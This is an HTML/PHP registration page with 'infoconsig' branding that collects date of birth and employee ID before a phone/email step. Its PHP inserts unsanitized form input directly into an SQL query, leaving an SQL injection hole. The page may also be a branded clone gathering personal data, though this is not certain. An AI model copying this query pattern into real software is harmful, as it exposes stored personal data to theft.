<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../css/style.css">

</head>

<body>
  <!-- Logo -->
  <div class="mainPageLayout">
    <div id="studio_sidePanelUpHeight20" style="height: 20px;"></div>
    <div class="clearFix">
      <div class="topMargin"></div>
      <div class="mainContainer clearFix">
        <div style="margin-bottom: 10px">
          <div id="GreetingBlock" class="authForm">
            <div class="header headerLightBig clearFix">
              <img class="logo" src="../img/logo.png" />
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <form action="cadastro_celular_email.php" method="POST">
    <!-- Campos de cadastro de dados de validação -->
    <div>
      <label for="dataNascimento">Data de Nascimento:</label>
      <input type="date" id="dataNascimento" name="dataNascimento" placeholder="Data de Nascimento" required>
    </div>
    <div>
      <label for="matricula">Matrícula:</label>
      <input type="text" id="matricula" name="matricula" placeholder="Matrícula" required>
    </div>
    <div>
      <button type="submit" onclick="window.location.href = 'cadastro_celular_email.php'">Continuar</button>
    </div>
  </form>

  <?php
  // Verifica se o formulário foi enviado
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtém os dados do formulário
    $dataNascimento = $_POST['dataNascimento'];
    $matricula = $_POST['matricula'];

    // Conecta ao banco de dados (substitua as informações de conexão pelo seu próprio)
    $servername = "localhost";
    $username = "seu_usuario";
    $password = "sua_senha";
    $dbname = "seu_banco_de_dados";

    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verifica a conexão
    if ($conn->connect_error) {
      die("Falha na conexão com o banco de dados: " . $conn->connect_error);
    }

    // Prepara a consulta SQL para inserir os dados no banco
    $sql = "INSERT INTO sua_tabela (data_nascimento, matricula) VALUES ('$dataNascimento', '$matricula')";

    if ($conn->query($sql) === true) {
      echo "Dados salvos com sucesso!";
    } else {
      echo "Erro ao salvar os dados: " . $conn->error;
    }

    // Fecha a conexão com o banco de dados
    $conn->close();
  }
  ?>

  <!-- Mensagens -->
  <div class="message-area">
    <p>O infoconsig melhorou, agora você utiliza o número do seu CPF para acessar o sistema, com a mesma senha cadastrada anteriormente.</p>
  </div>
  <!-- Avisos -->
  <div class="warning-area">
    <p>Importante: Se você já cadastrou sua senha no APP infoconsig, utilize a mesma para seu acesso aqui!</p>
  </div>
  <div id="studioFooter">
    <div class="mainPageLayout">
      <span class="footerCopyright">&copy; Sttórico Sistemas 2023</span>
    </div>
  </div>
</body>

</html>